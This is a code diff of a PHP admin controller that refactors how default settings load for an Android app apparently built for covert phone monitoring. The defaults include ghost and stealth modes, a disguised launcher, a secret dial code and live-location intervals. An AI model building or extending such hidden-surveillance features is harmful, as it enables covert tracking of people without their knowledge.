@@ -11,57 +11,49 @@ class DefaultsController extends BaseAdminController
     public function index()
     {
         $db = $this->getDb();
-        $this->ensureTableExists($db);
+        $defaults = null;
 
-        $defaults = $db->table('tbl_system_default_apps')
-            ->orderBy('version', 'DESC')
-            ->limit(1)
-            ->get()
-            ->getRowArray();
+        try {
+            $defaults = $db->table('tbl_system_default_apps')
+                ->orderBy('version', 'DESC')
+                ->limit(1)
+                ->get()
+                ->getRowArray();
+        } catch (\Throwable $e) {
+            log_message('error', 'DefaultsController index query error: ' . $e->getMessage());
+        }
+
+        if (!$defaults) {
+            $defaultConfig = [
+                'pref_auto_sync_v2'           => true,
+                'pref_sync_interval_v2'       => '6',
+                'pref_disable_uploads'        => false,
+                'pref_disable_file_uploads'   => false,
+                'pref_ghost_mode'             => false,
+                'pref_total_stealth_mode'     => false,
+                'pref_stealth_mode'           => 'com.niccher.eaves_droid_app.activities.Splash_Default',
+                'pref_dial_code'              => '*#007#',
+                'pref_secret_code'            => '1234',
+                'pref_server_url'             => '',
+                'pref_live_location_interval' => '30',
+                'pref_queue_sync_interval'    => '15',
+                'pref_deactivated'            => false,
+            ];
+            $defaults = [
+                'id'          => 1,
+                'version'     => 1,
+                'config_json' => json_encode($defaultConfig),
+                'created_at'  => date('Y-m-d H:i:s'),
+                'updated_at'  => date('Y-m-d H:i:s'),
+            ];
+        }
 
         return $this->renderView('admin/defaults', [
-            'pag' => 'admin-defaults',
+            'pag'      => 'admin-defaults',
             'defaults' => $defaults,
         ]);
     }
 
-    private function ensureTableExists($db)
-    {
-        if (!$db->tableExists('tbl_system_default_apps')) {
-            $db->query("CREATE TABLE IF NOT EXISTS tbl_system_default_apps (
-                id INT UNSIGNED AUTO_INCREMENT PRIMARY KEY,
-                config_json JSON NOT NULL,
-                version INT UNSIGNED NOT NULL DEFAULT 1,
-                created_by INT UNSIGNED DEFAULT NULL,
-                created_at DATETIME DEFAULT NULL,
-                updated_at DATETIME DEFAULT NULL,
-                FOREIGN KEY (created_by) REFERENCES users(id) ON DELETE SET NULL ON UPDATE CASCADE
-            ) ENGINE=InnoDB DEFAULT CHARSET=utf8");
-
-            $defaults = json_encode([
-                'pref_auto_sync_v2' => true,
-                'pref_sync_interval_v2' => '6',
-                'pref_disable_uploads' => false,
-                'pref_disable_file_uploads' => false,
-                'pref_ghost_mode' => false,
-                'pref_total_stealth_mode' => false,
-                'pref_stealth_mode' => 'com.niccher.eaves_droid_app.activities.Splash_Default',
-                'pref_dial_code' => '*#007#',
-                'pref_secret_code' => '1234',
-                'pref_server_url' => '',
-                'pref_live_location_interval' => '30',
-                'pref_queue_sync_interval' => '15',
-                'pref_deactivated' => false,
-            ]);
-
-            $db->table('tbl_system_default_apps')->insert([
-                'config_json' => $defaults,
-                'version' => 1,
-                'created_at' => date('Y-m-d H:i:s'),
-                'updated_at' => date('Y-m-d H:i:s'),
-            ]);
-        }
-    }
 
     public function save()
     {
